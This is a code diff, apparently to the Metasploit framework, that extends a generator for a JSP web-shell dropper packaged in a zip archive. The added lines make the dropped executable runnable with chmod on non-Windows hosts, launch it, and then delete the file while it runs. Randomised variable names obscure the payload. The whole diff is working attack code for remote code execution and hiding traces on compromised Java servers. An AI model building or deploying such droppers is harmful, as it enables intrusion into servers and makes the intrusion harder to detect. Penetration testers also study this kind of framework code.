@@ -638,6 +638,8 @@ require 'metasm'
 		var_exe           = Rex::Text.rand_text_alpha(rand(8)+8)
 		var_hexfile       = Rex::Text.rand_text_alpha(rand(8)+8)
 		var_proc          = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_fperm         = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_fdel          = Rex::Text.rand_text_alpha(rand(8)+8)
 
 		jspraw =  "<%@ page import=\"java.io.*\" %>\n"
 		jspraw << "<%\n"
@@ -671,7 +673,20 @@ require 'metasm'
 		jspraw << "#{var_outputstream}.write(#{var_bytes});\n"
 		jspraw << "#{var_outputstream}.close();\n"
 
+		jspraw << "if (System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") == -1){\n"
+		jspraw << "String[] #{var_fperm} = new String[3];\n"
+		jspraw << "#{var_fperm}[0] = \"chmod\";\n"
+		jspraw << "#{var_fperm}[1] = \"+x\";\n"
+		jspraw << "#{var_fperm}[2] = #{var_exepath};\n"
+		jspraw << "Process #{var_proc} = Runtime.getRuntime().exec(#{var_fperm});\n"
+		jspraw << "#{var_proc} = Runtime.getRuntime().exec(#{var_exepath});\n"
+		# Linux and other UNICES allow removing files while they are in use...
+		jspraw << "File #{var_fdel} = new File(#{var_exepath}); #{var_fdel}.delete();\n"
+		jspraw << "} else {\n"
+		# Windows does not ..
 		jspraw << "Process #{var_proc} = Runtime.getRuntime().exec(#{var_exepath});\n"
+		jspraw << "}\n"
+
 		jspraw << "%>\n"
 
 		zip.add_file("#{jsp_name}.jsp", jspraw)
